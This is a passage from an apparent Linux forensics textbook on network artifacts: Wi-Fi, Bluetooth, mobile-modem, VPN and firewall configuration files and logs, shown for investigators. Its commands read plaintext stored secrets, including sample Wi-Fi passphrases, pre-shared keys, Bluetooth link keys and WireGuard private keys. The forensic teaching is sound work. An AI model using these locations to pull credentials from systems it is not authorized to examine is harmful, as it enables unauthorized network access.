Aug 22 13:00:58 pc1 kernel: wlan0: send auth to 18:e8:29:a8:8b:e1 (try 1/3)&#13;
Aug 22 13:00:58 pc1 kernel: wlan0: authenticated&#13;
Aug 22 13:00:58 pc1 kernel: wlan0: associate with 18:e8:29:a8:8b:e1 (try 1/3)&#13;
Aug 22 13:00:58 pc1 kernel: wlan0: RX AssocResp from 18:e8:29:a8:8b:e1 (capab=&#13;
0x411 status=0 aid=4)&#13;
Aug 22 13:00:58 pc1 kernel: wlan0: associated</pre>&#13;
<p class="noindent">Here, the access point’s MAC address is shown with timestamps of when the system successfully authenticated.</p>&#13;
<p class="indent">The iwd daemon can be controlled over D-Bus by different network managers. The configuration file is <em>/etc/iwd/main.conf</em>, which is documented in the iwd.config(5) man page. The <em>/var/lib/iwd/*</em> directory contains a file for each network configured using iwd.</p>&#13;
<p class="indent">For example, the following is the file for a network called <em>myfreewifi</em>:</p>&#13;
<pre><span epub:type="pagebreak" id="page_239"/># <span class="codestrong1">cat /var/lib/iwd/myfreewifi.psk</span>&#13;
[Security]&#13;
PreSharedKey=28387e78ea98cceda4be87c9cf1a62fb8639dd48ea3d3352caca80ec5dfe3e68&#13;
Passphrase=monkey1999&#13;
&#13;
[Settings]&#13;
AutoConnect=false</pre>&#13;
<p class="noindent">The name of the network is part of the filename. The contents of the file contains the password to the network and other settings. The file creation timestamp is a possible indicator of when the network was first created and joined. The iwd.network(5) man page provides more information about the contents of the file.</p>&#13;
<p class="indent">On some distros (such as Red Hat and SUSE), configured Wi-Fi details may be found in the <em>/etc/sysconfig/</em> directory; for example:</p>&#13;
<pre># <span class="codestrong1">cat /etc/sysconfig/network/ifcfg-wlan0</span>&#13;
NAME=''&#13;
MTU='0'&#13;
BOOTPROTO='dhcp'&#13;
STARTMODE='ifplugd'&#13;
IFPLUGD_PRIORITY='0'&#13;
ZONE=''&#13;
WIRELESS_ESSID='myhotspot'&#13;
WIRELESS_AUTH_MODE='psk'&#13;
WIRELESS_MODE='managed'&#13;
WIRELESS_WPA_PSK='monkey1999'&#13;
WIRELESS_AP_SCANMODE='1'&#13;
WIRELESS_NWID=''</pre>&#13;
<p class="noindent">Here the <em>myhotspot</em> Wi-Fi network is configured and saved to the <em>ifcfg-wlan0</em> file, and the password is also in plain view.</p>&#13;
<p class="indent">The NetworkManager stores connection information in the directory <em>/etc/ NetworkManager/system-connections/</em>. A file for each connected network is made:</p>&#13;
<pre># <span class="codestrong1">cat /etc/NetworkManager/system-connections/Free_WIFI</span>&#13;
[connection]&#13;
id=Free_WIFI&#13;
uuid=320c6812-39b5-4141-9f8e-933c53365078&#13;
type=wifi&#13;
permissions=&#13;
secondaries=af69e818-4b14-4b1f-9908-187055aaf13f;&#13;
timestamp=1538553686&#13;
&#13;
[wifi]&#13;
mac-address=00:28:F8:A6:F1:85&#13;
mac-address-blacklist=&#13;
mode=infrastructure&#13;
<span epub:type="pagebreak" id="page_240"/>seen-bssids=D0:D4:12:D4:23:9A;&#13;
ssid=Free_WIFI&#13;
&#13;
[wifi-security]&#13;
key-mgmt=wpa-psk&#13;
psk=monkey1999&#13;
&#13;
[ipv4]&#13;
dns-search=&#13;
method=auto&#13;
&#13;
[ipv6]&#13;
addr-gen-mode=stable-privacy&#13;
dns-search=&#13;
ip6-privacy=0&#13;
method=auto</pre>&#13;
<p class="noindent">This shows the Wi-Fi network details, including a timestamp of when the network was first configured, SSID name, BSSID MAC address, and more. Depending on the configuration a password may also be found.</p>&#13;
<p class="indent">In addition, the NetworkManager saves information in the directory <em>/var/lib/NetworkManager/</em>, where you may find DHCP lease files containing information about obtained leases from various interfaces, as shown here:</p>&#13;
<pre># <span class="codestrong1">cat internal-320c6812-39b5-4141-9f8e-933c53365078-wlan0.lease</span>&#13;
# This is private data. Do not parse.&#13;
ADDRESS=192.168.13.10&#13;
NETMASK=255.255.255.0&#13;
ROUTER=192.168.13.1&#13;
SERVER_ADDRESS=192.168.13.1&#13;
NEXT_SERVER=192.168.13.1&#13;
T1=43200&#13;
T2=75600&#13;
LIFETIME=86400&#13;
DNS=192.168.13.1&#13;
DOMAINNAME=workgroup&#13;
HOSTNAME=pc1&#13;
CLIENTID=...</pre>&#13;
<p class="noindent">The creation (birth) timestamp of the file indicates when the lease was given by the DHCP server, and the file called <em>timestamps</em> contains a list of leases with an identifier associated with a lease filename and a numeric timestamp:</p>&#13;
<pre># <span class="codestrong1">cat timestamps</span>&#13;
[timestamps]&#13;
...&#13;
320c6812-39b5-4141-9f8e-933c53365078=1538553686&#13;
...</pre>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_241"/>Also, a list of BSSIDs (MAC addresses) that were seen is recorded in the <em>seen-bssids</em> files:</p>&#13;
<pre>[seen-bssids]&#13;
320c6812-39b5-4141-9f8e-933c53365078=D0:D4:12:D4:23:9A,&#13;
...</pre>&#13;
<p class="noindent">A Wi-Fi network (with the same SSID) may consist of multiple BSSIDs.</p>&#13;
<h5 class="h5"><strong>Linux Access Points</strong></h5>&#13;
<p class="noindent">If a Linux system was used as an access point, it was most likely using the hostapd software package. Check whether the hostapd package is installed and whether it was enabled to run as a systemd service. The hostapd configuration files are usually located in <em>/etc/hostapd/*</em>, and the <em>hostapd.conf</em> file contains the configuration of the Wi-Fi network(s) being provided, such as in this example:</p>&#13;
<pre># <span class="codestrong1">cat /etc/hostapd/hostapd.conf</span>&#13;
...&#13;
ssid=Bob's Free Wifi&#13;
...&#13;
wpa_passphrase=monkey1999&#13;
...&#13;
ignore_broadcast_ssid=1&#13;
...&#13;
country_code=CH&#13;
...</pre>&#13;
<p class="noindent">The Wi-Fi network name and password are shown, it’s a hidden network (broadcast ignored), and the region is specified (regulatory compliance). The original <em>hostapd.conf</em> file is well commented with further parameter examples, and more information can be found at <em><a href="https://w1.fi/hostapd/">https://w1.fi/hostapd/</a></em>.</p>&#13;
<p class="indent">A password can also be stored in password-based key derivation function (PBKDF2) format, in which case recovery is difficult, but it can be attempted with password recovery tools. Pre-shared key (PSK) strings in <em>hostapd.conf</em> look like this:</p>&#13;
<pre>wpa_psk=c031dc8c13fbcf26bab06d1bc64150ca53192c270f1d334703f7b85e90534070</pre>&#13;
<p class="noindent">This string does not reveal the password, but it is sufficient to gain access to a Wi-Fi network. The password might be found on another client device attached to the same network.</p>&#13;
<p class="indent">There are several places to look for MAC addresses of clients connecting to a hostapd access point. Hostapd writes logs to syslog by default, and the MAC addresses of other clients connecting and disconnecting may be found:</p>&#13;
<pre>Aug 22 09:32:19 pc1 hostapd[4000]: wlan0: STA 48:4b:aa:91:06:89 IEEE 802.11: authenticated&#13;
Aug 22 09:32:19 pc1 hostapd[4000]: wlan0: STA 48:4b:aa:91:06:89 IEEE 802.11: associated (aid 1)&#13;
<span epub:type="pagebreak" id="page_242"/>Aug 22 09:32:19 pc1 hostapd[4000]: wlan0: AP-STA-CONNECTED 48:4b:aa:91:06:89&#13;
...&#13;
Aug 22 09:32:29 pc1 hostapd[4000]: wlan0: AP-STA-DISCONNECTED 48:4b:aa:91:06:89&#13;
Aug 22 09:32:29 pc1 hostapd[4000]: wlan0: STA 48:4b:aa:91:06:89 IEEE 802.11: disassociated&#13;
Aug 22 09:32:30 pc1 hostapd[4000]: wlan0: STA 48:4b:aa:91:06:89 IEEE 802.11: deauthenticated&#13;
due to inactivity (timer DEAUTH/REMOVE)</pre>&#13;
<p class="noindent">Another place to look for possible MAC addresses is in the accept and deny files. If used, the location of these files is defined with the <code>accept_mac_file=</code> and <code>deny_mac_file=</code> parameters in the configuration. These files contain a list of MAC addresses that the administrator has explicitly allowed or blocked. These MAC addresses could be meaningful in a forensic investigation.</p>&#13;
<h4 class="h4" id="ch00lev2_116"><strong><em>Bluetooth Artifacts</em></strong></h4>&#13;
<p class="noindent">Bluetooth under Linux is achieved using a combination of kernel modules, daemons, and utilities. The Bluetooth subsystem retains multiple forensic artifacts that can be analyzed and associated with separate physical devices. Evidence of a Bluetooth device paired with a Linux system may be useful in an investigation.</p>&#13;
<p class="indent">Information about current and previously paired Bluetooth devices is found in the <em>/var/lib/bluetooth/</em> directory. There is an initial subdirectory named after the MAC address of the locally installed Bluetooth adapter:</p>&#13;
<pre># <span class="codestrong1">ls /var/lib/bluetooth/</span>&#13;
90:61:AE:C7:F1:9F/</pre>&#13;
<p class="noindent">The creation (birth) timestamp of this directory indicates when the adapter was first installed. If the Bluetooth adapter is on the mainboard, it will likely match the time of the distro installation. If a USB Bluetooth adapter was used, the creation time will indicate when it was first plugged in.</p>&#13;
<p class="indent">This local adapter device directory contains further directories and a <em>settings</em> file:</p>&#13;
<pre># <span class="codestrong1">ls /var/lib/bluetooth/90:61:AE:C7:F1:9F/</span>&#13;
00:09:A7:1F:02:5A/ 00:21:3C:67:C8:98/ cache/ settings</pre>&#13;
<p class="noindent">The <em>settings</em> file provides information about the discoverability. The MAC address directories are named after the currently paired devices. The <em>cache/</em> directory contains files named after current and previously paired device MAC addresses:</p>&#13;
<pre># <span class="codestrong1">ls /var/lib/bluetooth/90:61:AE:C7:F1:9F/cache/</span>&#13;
00:09:A7:1F:02:5A 00:21:3C:67:C8:98 08:EF:3B:82:FA:57 38:01:95:99:4E:31</pre>&#13;
<p class="noindent">These files include Bluetooth devices that the user has deleted from the paired devices list in the past.</p>&#13;
<p class="indent">The MAC address directories contain one or more files. An <em>info</em> file provides more information about the paired device:</p>&#13;
<pre><span epub:type="pagebreak" id="page_243"/># <span class="codestrong1">cat 00:21:3C:67:C8:98/info</span>&#13;
[General]&#13;
Name=JAMBOX by Jawbone&#13;
Class=0x240404&#13;
SupportedTechnologies=BR/EDR;&#13;
Trusted=true&#13;
Blocked=false&#13;
Services=00001108-0000-1000-8000-00805f9b34fb;0000110b-0000-1000-8000-00805f9b&#13;
34fb;0000110d-0000-1000-8000-00805f9b34fb;0000111e-0000-1000-8000-00805f9b34fb;&#13;
&#13;
[LinkKey]&#13;
Key=A5318CDADCAEDE5DD02D2A4FF523CD80&#13;
Type=0&#13;
PINLength=0</pre>&#13;
<p class="noindent">This shows the device MAC address (in the directory name), a description of the device and its services, and more.</p>&#13;
<p class="indent">The <em>cache/</em> directory is potentially more interesting from a historical perspective, as it contains both currently paired devices and previously paired devices. The files may have less information than the paired device <em>info</em> files, but a simple <code>grep</code> in the cache directory can show a list of previously used devices:</p>&#13;
<pre># <span class="codestrong1">grep Name= *</span> &#13;
00:09:A7:1F:02:5A:Name=Beoplay H9i&#13;
00:21:3C:67:C8:98:Name=JAMBOX by Jawbone&#13;
08:EF:3B:82:FA:57:Name=LG Monitor(57)&#13;
38:01:95:99:4E:31:Name=[Samsung] R3</pre>&#13;
<p class="noindent">The creation (birth) timestamps of these files may indicate when the device was paired with the Linux system.</p>&#13;
<p class="indent">The reconstruction of paired devices is interesting, but so is the actual usage of those paired devices. Depending on the device type and Bluetooth services used, that usage may be revealed in the logs:</p>&#13;
<pre>Aug 21 13:35:29 pc1 bluetoothd[1322]: Endpoint registered: sender=:1.54&#13;
path=/MediaEndpoint/A2DPSink/sbc&#13;
Aug 21 13:35:29 pc1 bluetoothd[1322]: Endpoint registered: sender=:1.54&#13;
path=/MediaEndpoint/A2DPSource/sbc&#13;
Aug 21 13:35:40 pc1 bluetoothd[1322]: /org/bluez/hci0/dev_38_01_95_99_4E_31/&#13;
fd1: fd(54) ready&#13;
...&#13;
Aug 21 13:52:44 pc1 bluetoothd[1322]: Endpoint unregistered: sender=:1.54&#13;
path=/MediaEndpoint/A2DPSink/sbc&#13;
Aug 21 13:52:44 pc1 bluetoothd[1322]: Endpoint unregistered: sender=:1.54&#13;
path=/MediaEndpoint/A2DPSource/sbc</pre>&#13;
<p class="noindent"><span epub:type="pagebreak" id="page_244"/>These logs indicate that the previously identified <code>[Samsung] R3</code> device was connected for 17 minutes.</p>&#13;
<p class="indent">Additional device-specific fields and files (attributes) may exist for each MAC address. Depending on the device and the relevance to an investigation, they may require additional scrutiny.</p>&#13;
<h4 class="h4" id="ch00lev2_117"><strong><em>WWAN Artifacts</em></strong></h4>&#13;
<p class="noindent">Many laptops today are able access mobile networks (3G/4G/5G, and so on) using an internal modem or plug-in USB device, together with a SIM card provided by the carrier. Linux supports these mobile technologies, and traces of activity can be found in local configuration files, databases, and logs.</p>&#13;
<p class="indent">There are several ways a Linux system interfaces with mobile modems:</p>&#13;
<ul>&#13;
<li class="noindent">Legacy serial devices: <em>/dev/ttyUSB*</em> controlled with AT commands</li>&#13;
<li class="noindent">USB communications device class (CDC) devices: <em>/dev/cdc-wdm*</em> controlled with a binary protocol<sup><a id="ch08foot04" href="footnotes.xhtml#ch08foot_04">4</a></sup></li>&#13;
<li class="noindent">PCIe devices: <em>/dev/wwan*</em> controlled over the modem host interface (MHI)<sup><a id="ch08foot05" href="footnotes.xhtml#ch08foot_05">5</a></sup></li>&#13;
</ul>&#13;
<p class="noindent">Once the mobile connection is authenticated, authorized, and established, the network interface can be configured. Common network interface names include <code>ppp*</code> (for legacy modems), <code>wwan*</code>, <code>ww*</code> (for renamed interfaces), and <code>mhi*</code> (for MHI based PCIe modems). The modem device names and network interfaces can be found in the logs and may reveal connectivity to mobile infrastructure.</p>&#13;
<p class="indent">The next few examples show an integrated USB modem using the MBIM protocol to connect to a mobile network. Here, the modem device is detected by the kernel and a <code>wwan0</code> network device is created:</p>&#13;
<pre>Dec 21 08:32:16 pc1 kernel: cdc_mbim 1-6:1.12: cdc-wdm1: USB WDM device&#13;
Dec 21 08:32:16 pc1 kernel: cdc_mbim 1-6:1.12 wwan0: register 'cdc_mbim' at&#13;
usb-0000:00:14.0-6, CDC MBIM, 12:33:b9:88:76:c1&#13;
Dec 21 08:32:16 pc1 kernel: usbcore: registered new interface driver cdc_mbim</pre>&#13;
<p class="indent">The ModemManager daemon then takes over the management of the device and setting up the mobile connection:</p>&#13;
<pre>Dec 21 08:32:21 pc1 ModemManager[737]: [/dev/cdc-wdm1] opening MBIM device...&#13;
Dec 21 08:32:21 pc1 ModemManager[737]: [/dev/cdc-wdm1] MBIM device open&#13;
...&#13;
Dec 21 08:32:23 pc1 ModemManager[737]: &lt;info&gt; [modem0] state changed (disabled&#13;
 -&gt; enabling)&#13;
...&#13;
Dec 21 08:50:54 pc1 ModemManager[737]: &lt;info&gt; [modem0] 3GPP registration state&#13;
 changed (searching -&gt; registering)&#13;
<span epub:type="pagebreak" id="page_245"/>Dec 21 08:50:54 pc1 ModemManager[737]: &lt;info&gt; [modem0] 3GPP registration state&#13;
 changed (registering -&gt; home)&#13;
Dec 21 08:50:54 pc1 ModemManager[737]: &lt;info&gt; [modem0] state changed&#13;
 (searching -&gt; registered)&#13;
...&#13;
Dec 21 08:50:57 pc1 ModemManager[737]: &lt;info&gt; [modem0] state changed&#13;
 (connecting -&gt; connected)</pre>&#13;
<p class="noindent">Here, the ModemManager logs several state changes. It enables the modem, searches for the provider and home network, registers the device, and connects to the network.</p>&#13;
<p class="indent">After the device is connected at the modem layer, the NetworkManager takes over, requesting and configuring the IP network (IP addresses, routing, and DNS):</p>&#13;
<pre>Dec 21 08:50:57 pc1 NetworkManager[791]: &lt;info&gt; [1608537057.3306]&#13;
 modem-broadband[cdc-wdm1]: IPv4 static configuration:&#13;
Dec 21 08:50:57 pc1 NetworkManager[791]: &lt;info&gt; [1608537057.3307]&#13;
 modem-broadband[cdc-wdm1]: address 100.83.126.236/29&#13;
Dec 21 08:50:57 pc1 NetworkManager[791]: &lt;info&gt; [1608537057.3307]&#13;
 modem-broadband[cdc-wdm1]: gateway 100.83.126.237&#13;
Dec 21 08:50:57 pc1 NetworkManager[791]: &lt;info&gt; [1608537057.3308]&#13;
 modem-broadband[cdc-wdm1]: DNS 213.55.128.100&#13;
Dec 21 08:50:57 pc1 NetworkManager[791]: &lt;info&gt; [1608537057.3308]&#13;
 modem-broadband[cdc-wdm1]: DNS 213.55.128.2</pre>&#13;
<p class="noindent">The mobile provider gives the mobile interface an IP address, default gateway, and DNS servers. By default, the kernel and ModemManager don’t log mobile identifier information such as the IMSI or IMEI. Depending on regional regulatory requirements, this connection information may be logged by the mobile provider.</p>&#13;
<p class="indent">Some Linux systems may have the <em>Modem Manager GUI</em> installed that can send and receive SMS text messages and USSD commands. The Modem Manager GUI stores SMS messages in a GNU database (<code>sms.gdbm</code>) in the user’s home directory with a unique device identifier for a directory name:</p>&#13;
<pre>$ ls ~/.local/share/modem-manager-gui/devices/01f42c67c3e3ab75345981a5c355b545/&#13;
sms.gdbm</pre>&#13;
<p class="noindent">This file can be dumped with the <code>gdbm_dump</code> tool (part of the gdbm package), but the <code>strings</code> command will also produce readable output:</p>&#13;
<pre>$ <span class="codestrong1">strings sms.gdbm</span>&#13;
...&#13;
783368690&lt;sms&gt;&#13;
    &lt;number&gt;+41123456789&lt;/number&gt;&#13;
    &lt;time&gt;18442862660071983976&lt;/time&gt;&#13;
    <span epub:type="pagebreak" id="page_246"/>&lt;binary&gt;0&lt;/binary&gt;&#13;
    &lt;servicenumber&gt;+41794999005&lt;/servicenumber&gt;&#13;
    &lt;text&gt;Do you have the bank codes?&lt;/text&gt;&#13;
    &lt;read&gt;1&lt;/read&gt;&#13;
    &lt;folder&gt;0&lt;/folder&gt;&#13;
&lt;/sms&gt;&#13;
1102520059&lt;sms&gt;&#13;
    &lt;number&gt;+41123456789&lt;/number&gt;&#13;
    &lt;time&gt;1608509427&lt;/time&gt;&#13;
    &lt;binary&gt;0&lt;/binary&gt;&#13;
    &lt;servicenumber&gt;(null)&lt;/servicenumber&gt;&#13;
    &lt;text&gt;No, I have to steal them first!&lt;/text&gt;&#13;
    &lt;read&gt;1&lt;/read&gt;&#13;
    &lt;folder&gt;1&lt;/folder&gt;&#13;
&lt;/sms&gt;</pre>&#13;
<p class="noindent">Each SMS message is shown within the <code>&lt;text&gt;</code> tags. The phone numbers and times<sup><a id="ch08foot06" href="footnotes.xhtml#ch08foot_06">6</a></sup> are shown, and the <code>&lt;read&gt;</code> tag indicates if an incoming message was read or not. The folder numbers represent incoming messages (<code>0</code>), sent messages (<code>1</code>), and draft messages (<code>2</code>). More information can be found at <em><a href="https://sourceforge.net/projects/modem-manager-gui/">https://sourceforge.net/projects/modem-manager-gui/</a></em>.</p>&#13;
<h3 class="h3" id="ch00lev1_41"><strong>Network Security Artifacts</strong></h3>&#13;
<p class="noindent">The topic of network security involves protecting the perimeter of a system with firewalls and protecting the privacy and integrity of network traffic. The following sections describe common firewalls and VPNs under Linux and how to analyze the logs, configuration, and other persistent information that may be of interest in a forensic investigation. Focus will be especially given to (relatively) new technologies such as NFTables and WireGuard. The SSH protocol also provides a layer of network security (see <a href="ch10.xhtml">Chapter 10</a>).</p>&#13;
<h4 class="h4" id="ch00lev2_118"><strong><em>WireGuard, IPsec, and OpenVPN</em></strong></h4>&#13;
<p class="noindent">WireGuard is a relative newcomer to the VPN landscape. It was originally developed for Linux by Jason Donenfeld and is now a default part of the kernel. WireGuard was designed for simplicity, and implemented as a kernel module that creates a virtual interface. The interface behaves like any other network interface: it can be brought up or down, be firewalled, route traffic, or be queried with standard network interface tools. A packet sniffer like tcpdump or Wireshark can also be used to capture network traffic.</p>&#13;
<p class="indent">WireGuard is a point-to-point tunnel-mode VPN, encapsulating IP packets inside UDP and transmitting them to configured peers. Modern cryptographic protocols (such as Curve, ChaCha, and so on) are used, and the key <span epub:type="pagebreak" id="page_247"/>management is in-band. Its ease of use, performance, and stealthy behavior are making WireGuard popular among hobbyists, researchers, and the hacking community.</p>&#13;
<p class="indent">WireGuard interfaces can be arbitrarily named by the system owner, but <code>wg0</code> is most commonly used. References to this device may be found in configuration files and logs wherever you would use other network interface names (like <code>eth0</code> and so on).</p>&#13;
<p class="indent">Each WireGuard interface typically has one configuration file that contains a private key, public keys of all peers, IP addresses of endpoints, and allowed IP ranges. The WireGuard configuration information is usually found in one of several places:</p>&#13;
<ul>&#13;
<li class="noindent">The WireGuard default file, <em>/etc/wireguard/wg0.conf</em></li>&#13;
<li class="noindent">A systemd <em>.netdev</em> file like <em>/etc/systemd/network/wg0.netdev</em></li>&#13;
<li class="noindent">A NetworkManager file like <em>/etc/NetworkManager/system-connections/ Wireguard connection 1</em></li>&#13;
</ul>&#13;
<p class="indent">The <em>/etc/wireguard/</em> directory may have one or more configuration files named after the interface. The files look like this:</p>&#13;
<pre># <span class="codestrong1">cat /etc/wireguard/wg0.conf</span>&#13;
[Interface]&#13;
PrivateKey = 4O0xcLvb6TgH79OXhY6sRfa7dWtZRxgQNlwwXJaloFo=&#13;
ListenPort = 12345&#13;
Address = 192.168.1.1/24&#13;
&#13;
[Peer]&#13;
PublicKey = EjREDBYxKYspNBuEQDArALwARcAzKV3Q5TM565XQ1Eo=&#13;
AllowedIPs = 192.168.1.0/24&#13;
Endpoint = 192.168.1.2:12345</pre>&#13;
<p class="noindent">The <code>[Interface]</code> section describes the local machine, and the <code>[Peer]</code> section(s) describe the trusted peers (there can be more than one peer).</p>&#13;
<p class="indent">Systemd supports WireGuard configuration in a .<em>netdev</em> file, as follows:</p>&#13;
<pre># <span class="codestrong1">cat /etc/systemd/network/wg0.netdev</span>&#13;
[NetDev]&#13;
Name=wg0&#13;
Kind=wireguard&#13;
&#13;
[WireGuard]&#13;
PrivateKey = 4O0xcLvb6TgH79OXhY6sRfa7dWtZRxgQNlwwXJaloFo=&#13;
ListenPort = 12345&#13;
&#13;
[WireGuardPeer]&#13;
PublicKey = EjREDBYxKYspNBuEQDArALwARcAzKV3Q5TM565XQ1Eo=&#13;
AllowedIPs = 192.168.1.0/24&#13;
Endpoint =</pre>&#13;
<p class="noindent"><span epub:type="pagebreak" id="page_248"/>An associated <em>.network</em> file may be needed to configure the IP address of the interface.</p>&#13;
<p class="indent">The NetworkManager daemon has a VPN plug-in for WireGuard and can be configured alongside other VPNs:</p>&#13;
<pre># <span class="codestrong1">cat "/etc/NetworkManager/system-connections/VPN connection 1.nmconnection"</span>&#13;
[connection]&#13;
id=VPN connection 1&#13;
uuid=4facf054-a3ea-47a1-ac9d-c0ff817e5c78&#13;
type=vpn&#13;
autoconnect=false&#13;
permissions=&#13;
timestamp=1608557532&#13;
&#13;
[vpn]&#13;
local-ip4=192.168.1.2&#13;
local-listen-port=12345&#13;
local-private-key=YNAP0mMBjCEIT1m7GpE8icIdUTLn10+Q76P+ThItyHE=&#13;
peer-allowed-ips=192.168.1.0/24&#13;
peer-endpoint=192.168.1.1:12345&#13;
peer-public-key=Tmktbu0eM//SYLA51O4U7LqoSpbis9MAnyPL/z5LTm0=&#13;
service-type=org.freedesktop.NetworkManager.wireguard&#13;
...</pre>&#13;
<p class="noindent">The WireGuard configuration follows the NetworkManager file format described earlier in this chapter.</p>&#13;
<p class="indent">The software package <em>wireguard-tools</em> provides documentation, systemd unit files, and tools for configuring WireGuard. The <code>wg-quick</code> script was created for easy command line use. Forensic investigators should examine the shell history for evidence of manual use of the <code>wg</code> and <code>wg-quick</code> tools.</p>&#13;
<p class="indent">WireGuard’s configuration provides several artifacts that may be interesting from a forensics perspective. The IP addresses used for the <code>wg0</code> interface may be found in both the local and the remote peer’s logs or configuration. The public keys of peers provide a cryptographic association between multiple machines (increased strength of evidence). The allowed IP list describes a range of IP addresses expected to exist behind the remote peer (possible routed networks). These IPs may also appear in the logs and may be of significance. All of these artifacts are helpful in reconstructing a VPN network setup.</p>&#13;
<p class="indent">IPsec is an IETF standard, and the associated protocols are documented in dozens of RFCs. IPsec operates in either tunnel-mode (encrypting whole packets) or transport-mode (encrypting just payloads). IPsec is a standard part of the kernel that can encrypt and authenticate traffic, but userspace tools and daemons are needed for configuration and key management. Out-of-band key management is performed using Internet Key Exchange (IKE), a daemon provided independently by various implementations.</p>&#13;
<p class="indent">The three most current IPsec implementations for Linux are StrongSwan (<em><a href="https://www.strongswan.org/">https://www.strongswan.org/</a></em>), Openswan (<em><a href="https://www.openswan.org/">https://www.openswan.org/</a></em>), and <span epub:type="pagebreak" id="page_249"/>Libreswan (<em><a href="https://libreswan.org/">https://libreswan.org/</a></em>). These implementations store configuration data on the local system and log various usage. Check locally installed packages and associated directories in <em>/etc/</em> for the existence of these IPsec implementations. If they have been installed, the configuration and logs can be analyzed to understand usage and recover interesting forensic artifacts.</p>&#13;
<p class="indent">OpenVPN (<em><a href="https://openvpn.net/">https://openvpn.net/</a></em>) was originally developed as a TLS-based userspace competitor to IPsec. OpenVPN is the name of both the commercial company and the open source project. OpenVPN’s advantage is not performance, but ease of use. Another difference from IPsec is its focus on authenticating people rather than machines to allow network access to protected networks.</p>&#13;
<p class="indent">The <code>openvpn</code> program (installed as part of the openvpn package) can run as a client or server, depending on the startup flags used. Configuration data can be found in the <em>/etc/openvpn/client/</em> or <em>/etc/openvpn/server/</em> directories. See the openvpn(8) man page for more information. The NetworkManager daemon has an OpenVPN plug-in and may have a separate configuration file (or files) in the <em>/etc/NetworkManager/</em> directory.</p>&#13;
<h4 class="h4" id="ch00lev2_119"><strong><em>Linux Firewalls and IP Access Control</em></strong></h4>&#13;
<p class="noindent">Linux has a long history of firewall support and has made many significant changes to the kernel firewall subsystem over time (nftables replaced iptables, which replaced ipchains, which replaced ipfwadm). The most recent major change was the replacement of iptables with nftables.</p>&#13;
<p class="indent">Linux also has a basic firewall functionality called Berkeley Packet Filter (BPF), which is often used for filtering by process or systemd unit. Other IP filtering is done in the form of userspace access control lists for network-facing applications. Depending on the context of a forensic investigation, an examination of firewall controls (or lack thereof) may be important.</p>&#13;
<p class="indent">Linux network firewalling is done in the kernel. Userspace tools and daemons can manage the firewall (and other network components), but they only pass configuration information to the kernel. To remain persistent, the firewall rules must also be added to the kernel on boot. Firewall logging is done through the kernel’s ring buffer, as described in <a href="ch05.xhtml">Chapter 5</a>.</p>&#13;
<p class="indent">The nftables firewall functionality is a significant upgrade to the old iptables system, and all distros and tools are replacing the legacy iptables with it (compatibility scripts make this easy). In addition, nftables combines IPv4, IPv6, and MAC address filtering into a single configuration file and allows multiple actions per rule.</p>&#13;
<p class="indent">If configured by hand (on servers, for example), the typical nftables configuration location is in the <em>/etc/nftables.conf</em> file or an <em>/etc/nftables/</em> directory. This file is typically loaded by a systemd unit, either automatically at boot or manually after changes have been made. Here is an example configuration file:</p>&#13;
<pre>$ <span class="codestrong1">cat /etc/nftables.conf</span>&#13;
table inet filter {&#13;
  chain input {&#13;
   <span epub:type="pagebreak" id="page_250"/>type filter hook input priority 0;&#13;
&#13;
   # allow return packets from outgoing connections&#13;
   ct state {established, related} accept&#13;
&#13;
   # allow from loopback&#13;
   iifname lo accept&#13;
&#13;
   # allow icmp and ssh&#13;
   ip protocol icmp accept&#13;
   tcp dport 22 accept&#13;
&#13;
   # block everything else&#13;
   reject with icmp type port-unreachable&#13;
 }&#13;
 chain forward {&#13;
   type filter hook forward priority 0;&#13;
   drop&#13;
 }&#13;
 chain output {&#13;
   type filter hook output priority 0;&#13;
 }&#13;
}</pre>&#13;
<p class="noindent">The kernel firewall in this example is configured to allow outgoing connections (including return packets), allow incoming <code>ping</code> and <code>ssh</code>, and block the rest (and prevent routing). The comments in the file explain the rules. See the nft(8) man page for more information about nftables rules.</p>&#13;
<p class="indent">Linux distros may have their own mechanism for managing firewall rules. Ubuntu uses Uncomplicated FireWall (UFW) to specify rules that are passed to iptables/nftables. Configuration and firewall rule files are located in the <em>/etc/ufw/</em> directory. The <code>ENABLED=</code> setting in <em>ufw.conf</em> indicates whether the firewall is active. If logging is enabled, UFW will log to syslog, which may save logs to <em>/var/log/ufw.log</em> (if rsyslog is configured).</p>&#13;
<p class="indent">Fedora/Red Hat and SUSE use firewalld to configure nftables (SUSE replaced its old SuSEfirewall2 system in SLES15). The firewalld daemon is enabled in systemd, and configuration is found in the <em>/etc/firewalld/</em> directory. If logging is enabled, logs are written to <em>/var/log/firewalld</em>. All these distro-specific rule management systems (scripts or GUIs) ultimately just add rules to nftables in the kernel.</p>&#13;
<p class="indent">Some firewall rules may be dynamically created by security software or intrusion prevention systems (IPSs) reacting to malicious activity. For instance, the fail2ban software package runs a daemon that monitors various logfiles for brute-force attacks. If a malicious IP address is detected, it is temporarily banned using iptables or nftables. Banned IP addresses from fail2ban are logged. Other similar IPS software (sshguard is an alternative <span epub:type="pagebreak" id="page_251"/>to fail2ban) may also be running on a system and logging malicious activity.</p>&#13;
<p class="indent">Systemd unit files may contain directives that perform access IP control. Depending on the unit type, the directives <code>IPAddressAllow=</code> and <code>IPAddressDeny=</code> may be found in the <code>[Slice]</code>, <code>[Scope]</code>, <code>[Service]</code>, <code>[Socket]</code>, <code>[Mount]</code>, or <code>[Swap]</code> sections of a unit file. This systemd feature does not use nftables, but rather the extended Berkeley Packet Filter (eBPF), which is also part of the kernel. See the systemd.resource-control(5) man page for more information.</p>&#13;
<p class="indent">Applications may configure their own filter controls, where IP access decisions are made by userspace processes (not in the kernel). A traditional way of doing this is with <em>/etc/hosts.allow</em> and <em>/etc/hosts.deny</em> files. These files allow tailored access controls for applications that are compiled with the libwrap (TCP wrappers) library. See the hosts_access(5) man page for more information.</p>&#13;
<p class="indent">Many applications have their own IP access control mechanisms that can be specified in their configuration files, which often allows more flexible access control tied to the application. For example, the Apache web server can be configured to allow access to only parts of the web tree for certain IP addresses:</p>&#13;
<pre>&lt;Directory /secretstuff&gt;&#13;
        Require ip 10.0.0.0/24&#13;
&lt;/Directory&gt;</pre>&#13;
<p class="noindent">In this example, anyone trying to access the <em>/secretstuff</em> directory from outside the defined IP address ranges will receive an “HTTP 403 Forbidden” error.</p>&#13;
<p class="indent">Here is another example where SSH allows logins only for selected users coming from a specified IP address:</p>&#13;
<pre>$ <span class="codestrong1">cat /etc/ssh/sshd_config</span>&#13;
# only users from pc1 are allowed&#13;
AllowUsers root@10.0.0.1 sam@10.0.0.1&#13;
...</pre>&#13;
